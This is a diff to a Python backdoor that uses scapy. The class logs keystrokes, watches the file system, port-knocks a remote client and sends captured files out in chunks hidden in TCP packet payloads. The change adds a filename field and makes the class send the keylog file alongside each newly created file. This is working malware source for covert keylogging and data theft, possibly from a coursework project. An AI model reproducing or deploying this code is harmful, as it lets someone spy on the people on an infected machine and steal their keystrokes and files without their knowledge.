@@ -1,7 +1,9 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
+from scapy.fields import StrField
 from scapy.layers.inet import UDP, IP, TCP
 from scapy.all import sniff, send, Raw
+from scapy.packet import Packet
 from scapy.volatile import RandShort
 from subprocess import run
 import sys
@@ -16,6 +18,13 @@ from watch import EventHandler
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 from typing import List
+
+
+class FileInfo(Packet):
+    name = "FileInfo"
+    fields_desc = [
+        StrField("filename", "")
+    ]
 
 
 key_code_map = {
@@ -124,6 +133,7 @@ key_code_map = {
     125: ' <WINDOWS_KEY> '
 }
 
+
 class BackDoor:
     def __init__(self):
         print("Backdoor has been initiated")
@@ -145,7 +155,6 @@ class BackDoor:
         self.watch_status = False
         self.sequence = []
         self.src_port = ""
-
 
     def start(self) -> None:
         self.process_yaml()
@@ -187,7 +196,6 @@ class BackDoor:
                     except KeyError:
                         f.write(f" <Unmapped keycode: {event.code}> ")
 
-
     def process_yaml(self) -> None:
         with open('config.yaml', 'r') as f:
             config = yaml.safe_load(f)
@@ -219,7 +227,7 @@ class BackDoor:
         file = path.split("/")[-1]
         directory = ""
         index = 0
-        for i in range(len(path)-1, -1, -1):
+        for i in range(len(path) - 1, -1, -1):
             if path[i] == "/":
                 index = i
                 break
@@ -234,21 +242,25 @@ class BackDoor:
         self.port_knock()
         # Give time for client to open ports
         time.sleep(2)
-        self.prepare_data()
+        # Send created file
+        self.prepare_data(self.path)
+        # Send keylog file
+        self.prepare_data(self.log)
 
-    def prepare_data(self) -> None:
+    def prepare_data(self, path: str) -> None:
         """Gets file data and sends through specified protocol"""
-        print(f"sending {self.path}")
-        binary_data = self.get_bin()
+        print(f"sending {path}")
+        filename = path.split("/")[-1]
+        binary_data = self.get_bin(path)
         if self.proto == "tcp":
             print(f"sending {self.proto}")
-            self.create_tcp(binary_data)
+            self.create_tcp(binary_data, filename)
         elif self.proto == "udp":
             print(f"sending {self.proto}")
         else:
             print(f"sending {self.proto}")
 
-    def create_tcp(self, data: List) -> None:
+    def create_tcp(self, data: List, name: str) -> None:
         """Creates a TCP packet and embeds data in payload"""
         print("Creating TCP packets")
         packets = []
@@ -257,7 +269,8 @@ class BackDoor:
             packets.append(packet)
 
         # Add packet to specify end of file
-        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=b'\x00')
+        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) \
+                 / FileInfo(filename=name) / Raw(load=b'\x00')
         packets.append(packet)
         self.send_pkt(packets)
 
@@ -270,17 +283,17 @@ class BackDoor:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def get_bin(self) -> List:
+    def get_bin(self, path: str) -> List:
         """ Separates a file into chunks of data that can be
         sent in individual payloads
         """
-        with open(self.path, 'rb') as f:
+        with open(path, 'rb') as f:
             data = f.read()
         load_size = 1024
         binary_data = [data[i:i + load_size] for i in range(0, len(data), load_size)]
         return binary_data
 
-    def port_knock(self)  -> None:
+    def port_knock(self) -> None:
         """Creates and sends sequence of packets to
         open client port
         """
